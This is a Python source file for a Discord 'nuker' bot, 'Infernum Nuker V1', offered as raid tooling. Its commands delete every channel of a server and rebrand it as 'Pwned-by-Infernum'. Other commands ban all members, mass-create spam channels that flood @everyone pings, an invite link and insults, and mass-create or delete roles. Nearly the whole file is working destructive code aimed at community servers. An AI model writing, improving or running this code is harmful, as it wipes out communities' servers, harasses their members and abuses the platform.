import discord
from discord.ext import commands
import asyncio
import random, discord, threading, os, datetime, asyncio
from concurrent.futures import ThreadPoolExecutor
from time import sleep
from colorama import Fore, Back, Style
from discord.ext import commands, tasks
import aiohttp
from colorama import Fore, Back, Style, init

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.guild_messages = True

bot = commands.Bot(command_prefix='$', intents=intents)

init(autoreset=True)

ascii_art = Fore.MAGENTA + r"""
$$$$$$\            $$$$$$\                                                             $$\   $$\           $$\                           
\_$$  _|          $$  __$$\                                                            $$$\  $$ |          $$ |                          
  $$ |  $$$$$$$\  $$ /  \__|$$$$$$\   $$$$$$\  $$$$$$$\  $$\   $$\ $$$$$$\$$$$\        $$$$\ $$ |$$\   $$\ $$ |  $$\  $$$$$$\   $$$$$$\  
  $$ |  $$  __$$\ $$$$\    $$  __$$\ $$  __$$\ $$  __$$\ $$ |  $$ |$$  _$$  _$$\       $$ $$\$$ |$$ |  $$ |$$ | $$  |$$  __$$\ $$  __$$\ 
  $$ |  $$ |  $$ |$$  _|   $$$$$$$$ |$$ |  \__|$$ |  $$ |$$ |  $$ |$$ / $$ / $$ |      $$ \$$$$ |$$ |  $$ |$$$$$$  / $$$$$$$$ |$$ |  \__|
  $$ |  $$ |  $$ |$$ |     $$   ____|$$ |      $$ |  $$ |$$ |  $$ |$$ | $$ | $$ |      $$ |\$$$ |$$ |  $$ |$$  _$$<  $$   ____|$$ |      
$$$$$$\ $$ |  $$ |$$ |     \$$$$$$$\ $$ |      $$ |  $$ |\$$$$$$  |$$ | $$ | $$ |      $$ | \$$ |\$$$$$$  |$$ | \$$\ \$$$$$$$\ $$ |      
\______|\__|  \__|\__|      \_______|\__|      \__|  \__| \______/ \__| \__| \__|      \__|  \__| \______/ \__|  \__| \_______|\__|      
                                                                                                                                                                    
:: Infernum commands ::
*nuke     - Nuke server
*banall   - Bans all members
*spam     - Spams channels
*rol      - Create roles
*drol     - Delete roles
*helpm    - all the commands

Infernum Nuker V1
By - ils
"""

print(ascii_art)

@bot.command()
async def spam(ctx):
    try:
        await ctx.message.delete()
    except:
        pass

    new_message = (
        "||@everyone @here|| `Join ifs:` https://discord.gg/NCEun68ZZp\n"
        "https://media.discordapp.net/attachments/1353088681321304196/1353251069387603989/elnene.gif\n"
        "F = Anormal de mierda, infernum on top! \n"
    )

    async def create_channel(name, message_count):
        for _ in range(20):
            try:
                new_channel = await ctx.guild.create_text_channel(name)
                tasks = [new_channel.send(new_message) for _ in range(message_count)]
                await asyncio.gather(*tasks)
                await asyncio.sleep(0.1)
            except:
                await asyncio.sleep(0.1)

    tasks = [create_channel("Raid-by-infernum", 20) for _ in range(60)]
    await asyncio.gather(*tasks)


@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    try:
        await ctx.message.delete()
    except:
        pass

    guild = ctx.guild
    if guild is None:
        return

    image_url = "https://media.discordapp.net/attachments/1294034108401586217/1396867559378387014/bebe.png?ex=687fa5ca&is=687e544a&hm=d9ced0da6c8312b4822304b0cd95023b2b0ad56535cbf18bfc1b97ca58a7e793&=&format=webp&quality=lossless&width=580&height=589"  

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(image_url) as resp:
                if resp.status == 200:
                    icon_bytes = await resp.read()
                    try:
                        await guild.edit(name="Pwned-by-Infernum", icon=icon_bytes)
                    except:
                        pass
    except:
        pass

    try:
        await asyncio.gather(*(channel.delete() for channel in guild.channels if channel))
    except:
        pass

    try:
        await guild.create_text_channel("Raid-By-Infernum")
    except:
        pass


@bot.command()
@commands.cooldown(1, 380, commands.BucketType.guild)

async def banall(ctx):

    async def make_banall(member):

        await member.ban()

    tasks = []

    for member in ctx.guild.members:

        task = asyncio.create_task(make_banall(member))

        tasks.append(task)

    await asyncio.gather(*tasks)


@bot.command()
async def rol(ctx):
    try:
        await ctx.message.delete()
    except:
        pass

    role_name = "PwnedByInfernumSquad"

    async def create_role():
        try:
            await ctx.guild.create_role(name=role_name)
        except:
            pass

    tasks = [asyncio.create_task(create_role()) for _ in range(50)]
    await asyncio.gather(*tasks)


@bot.command()
async def drol(ctx):
    try:
        await ctx.message.delete()
    except:
        pass

    guild = ctx.guild

    async def delete_role(role):
        try:
            await role.delete()
        except (discord.Forbidden, discord.HTTPException):
            pass

    roles_to_delete = [role for role in guild.roles if role.name != "@everyone"]
    tasks = [asyncio.create_task(delete_role(role)) for role in roles_to_delete]
    await asyncio.gather(*tasks)


@bot.command()
async def helpm(ctx):
    try:
        await ctx.message.delete()
    except:
        pass

    embed = discord.Embed(title="`Infernum Squad 亗`", description="", color=0x000001)

    embed.add_field(name="`• $banall:`", value="Banea a todos los miembros del servidor", inline=False)
    embed.add_field(name="`• $nuke:`", value="Elimina todos los canales y cambia el icono y nombre del servidor.", inline=False)
    embed.add_field(name="`• $spam:`", value="Crea canales y envia spam", inline=False)
    embed.add_field(name="`• $rol:`", value="Crea 50 roles", inline=False)
    embed.add_field(name="`• $drol:`", value="Elimina todos los roles", inline=False)
    embed.add_field(name="`• $helpm:`", value="Todos los comandos del bot.", inline=False)

    embed.set_footer(text="`Prefix: $`")
    embed.set_footer(text="`Creator bot: ils`")
    embed.set_footer(text="https://guns.lol/ilsss                                            Best squad, ilswashere on top")

    embed.set_image(url="https://media.discordapp.net/attachments/1353088681321304196/1353251069387603989/elnene.gif")

    await ctx.send(embed=embed)

bot.run("Your bot token here")
